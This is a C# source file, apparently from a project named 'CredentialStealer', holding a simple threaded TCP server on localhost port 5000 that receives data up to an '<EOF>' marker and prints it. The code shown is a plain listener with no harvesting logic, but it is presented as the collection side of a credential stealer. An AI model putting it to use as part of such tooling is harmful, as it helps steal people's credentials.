using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace CredentialStealer.Client.Console
{
    class Server
    {
        private const int PORT = 5000;
        private const string IP = "127.0.0.1";
        private const string EOF = "<EOF>";
        private TcpListener tcpListener;
        private Thread listenThread;

        private void ListenForClients()
        {
            this.tcpListener.Start();
            while (true)
            {
                TcpClient client = this.tcpListener.AcceptTcpClient();
                Thread clientThread = new Thread(new ParameterizedThreadStart(HandleClientComm));
                clientThread.Start(client);
            }
        }
        public static byte[] read(NetworkStream clientStream, Encoding encoder)
        {
            byte[] result = new byte[0];
            int tokenSize = Convert.ToBase64String(encoder.GetBytes(EOF)).Length;
            while (true)
            {
                byte[] message = new byte[4096];
                int bytesRead = 0;
                try
                {
                    bytesRead = clientStream.Read(message, 0, 4096);
                }
                catch (Exception exception)
                {
                    System.Console.WriteLine(exception);
                    break;
                }
                if (bytesRead == 0)
                {
                    return result;
                }
                Array.Resize<byte>(ref result, result.Length + bytesRead);
                Array.Copy(message, 0, result, result.Length - bytesRead, bytesRead);
                if (encoder.GetString(result).EndsWith(EOF))
                {
                    break;
                }
            }
            int eofLength = encoder.GetBytes(EOF).Length;
            byte[] truncatedResult = new byte[result.Length - eofLength];
            Array.Copy(result, 0, truncatedResult, 0, truncatedResult.Length);
            return truncatedResult;
        }
        public static void write(NetworkStream clientStream, Encoding encoder, byte[] buffer)
        {
            byte[] plainBuffer = Utils.Utils.ConcatenateBytes(buffer, encoder.GetBytes(EOF));

            clientStream.Write(plainBuffer, 0, plainBuffer.Length);
            clientStream.Flush();
        }

        private void HandleClientComm(object client)
        {
            TcpClient tcpClient = (TcpClient)client;
            NetworkStream clientStream = tcpClient.GetStream();
            ASCIIEncoding encoder = new ASCIIEncoding();
            byte[] buffer = new byte[tcpClient.ReceiveBufferSize];
            buffer = read(clientStream, encoder);

            string dataReceived = Encoding.ASCII.GetString(buffer, 0, buffer.Length);
            System.Console.WriteLine("Received : " + dataReceived);

            tcpClient.Close();
        }
        public Server()
        {
            this.tcpListener = new TcpListener(IPAddress.Parse(IP), PORT);
            System.Console.WriteLine(String.Format("The server is listening at port {0} on IP {1}...",PORT,IP));
            this.listenThread = new Thread(new ThreadStart(ListenForClients));
            this.listenThread.Start();
        }
        public static void Main(string[] args)
        {
            new Server();
        }
    }
}